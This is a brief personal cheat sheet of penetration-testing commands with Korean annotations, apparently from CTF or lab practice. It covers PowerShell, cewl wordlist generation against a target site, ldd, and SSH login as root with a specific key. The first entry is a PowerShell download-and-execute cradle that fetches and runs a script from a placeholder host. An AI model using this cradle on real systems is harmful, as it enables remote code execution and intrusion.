# powershell
```powershell
IEX(New-Object Net.WebClient).DownloadString("http://ip/file")

Rename-Item -Path <String> -NewName <String>

Remove-Item -Path "C:\Path\To\YourFile.txt"
```

# cewl(Custom Word List generator)
```bash
cewl -d 5 -m 3 http://postfish.off/team.html -w /home/kali/Desktop/cewl.txt
```
---
# ldd
```bash
ldd /usr/bin/log-sweeper
```
- 실행 파일이 사용하는 공유 라이브러리(동적 라이브러리, .so 파일)를 보여주는 명령어
---
# ssh
```bash
ssh -i root -o IdentitiesOnly=true root@localhost
```
`-o IdentitiesOnly=true`
- 저장되어 있는 다른 키들을 같이 전송하기 때문에 해당하는 키만으로 인증하는 방법
